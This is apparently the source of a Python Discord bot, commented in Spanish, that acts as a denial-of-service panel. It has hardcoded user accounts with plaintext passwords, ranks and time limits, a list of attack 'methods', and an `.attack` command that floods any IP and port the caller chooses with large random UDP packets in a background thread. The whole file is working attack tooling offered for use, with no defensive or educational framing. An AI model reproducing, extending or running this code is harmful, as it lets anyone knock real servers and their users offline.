import discord
from discord.ext import commands
import threading
import socket
import random
import time

# Configuración del bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix='.', intents=intents)

# Usuarios válidos
users = {
    "Learn": {
        "password": "LearnXD",
        "rank": "Admin",
        "maxtime": 300
    },
    "FlackModder": {
        "password": "Flack",
        "rank": "Ópalo",
        "maxtime": 60
    },
    "Asky": {
        "password": "Asky",
        "rank": "Ópalo",
        "maxtime": 60
    },
    "Zyper": {
        "password": "ZyperGay",
        "rank": "Ópalo",
        "maxtime": 60
    }
}

# Métodos disponibles
methods = [
    "UDPGOOD", "UDPPPS", "DNSBOTNET", "DISCORD-CALL", "UDPRAW",
    "UDPGAME", "TCPBYPASS", "UDPBYPASS", "TCPROXIES"
]

# Usuarios conectados
connected_users = {}

# Función para enviar paquetes
def send_attack(ip, port, duration):
    timeout = time.time() + duration
    data = random._urandom(65535)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        sock.sendto(data, (ip, port))

# Comando de login
@bot.command()
async def login(ctx, username: str, password: str):
    if username in users and users[username]["password"] == password:
        connected_users[ctx.author.id] = username
        await ctx.send(f"✅ Usuario {username} autenticado correctamente.")
    else:
        await ctx.send("❌ Credenciales incorrectas.")

# Comando para listar métodos
@bot.command()
async def methods_list(ctx):
    if ctx.author.id not in connected_users:
        await ctx.send("❌ Debes iniciar sesión primero con `.login <usuario> <contraseña>`.")
        return
    await ctx.send(f"**Métodos disponibles:**\n{', '.join(methods)}")

# Comando para iniciar ataque
@bot.command()
async def attack(ctx, ip: str, port: int, method: str, duration: int):
    if ctx.author.id not in connected_users:
        await ctx.send("❌ Debes iniciar sesión primero con `.login <usuario> <contraseña>`.")
        return

    username = connected_users[ctx.author.id]
    user_info = users[username]

    if method.upper() not in methods:
        await ctx.send("❌ Método inválido. Usa `.methods_list` para ver los métodos disponibles.")
        return

    if duration > user_info["maxtime"]:
        await ctx.send(f"❌ Tiempo excedido. Tu tiempo máximo es {user_info['maxtime']} segundos.")
        return

    await ctx.send("🟣 Broadcasted instructions sent to API.")
    threading.Thread(target=send_attack, args=(ip, port, duration)).start()
